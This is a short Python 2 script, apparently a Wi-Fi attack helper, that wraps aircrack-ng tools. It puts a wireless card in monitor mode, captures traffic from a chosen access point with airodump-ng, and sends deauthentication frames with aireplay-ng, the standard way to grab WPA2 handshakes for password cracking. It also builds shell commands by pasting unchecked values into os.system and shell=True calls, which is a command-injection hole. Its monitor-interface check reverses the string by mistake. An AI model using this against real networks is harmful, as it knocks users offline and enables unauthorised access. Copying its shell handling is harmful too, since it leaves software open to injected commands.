import os
import subprocess
import time
class Wpa2:
    interface = "wlan0"
    procc = None

    def __init__(self, bssid, channel, fileName, interface="wlan0"):
        self.bssid = bssid
        self.fileName = fileName
        self.channel = channel
        if interface[-3::-1] == 'mon':
            interface = interface[:len(interface)-3]
        Wpa2.interface = interface
        self.checkKill()
        self.channelSetter()

    def specificScan(self):
        print "thread entered"
        Wpa2.procc = subprocess.Popen(["airodump-ng", "-c", self.channel, "--bssid", self.bssid, "-w", self.fileName, Wpa2.interface + "mon"])

    @staticmethod
    def Scan():
        os.system('clear')
        time.sleep(2)
        Wpa2.procc = subprocess.Popen(["airodump-ng", Wpa2.interface + "mon"])


    def Deauth(self):
        p = subprocess.Popen("gnome-terminal --command='aireplay-ng -0 50 --ig -a " + self.bssid + " " + Wpa2.interface + "mon'", stdout=subprocess.PIPE, shell=True)


    def channelSetter(self):
        os.system('airmon-ng stop ' + Wpa2.interface + 'mon ;airmon-ng start ' + Wpa2.interface + ' ' + self.channel)
        print self.channel

    @staticmethod
    def checkKill():
        os.system('airmon-ng check kill')



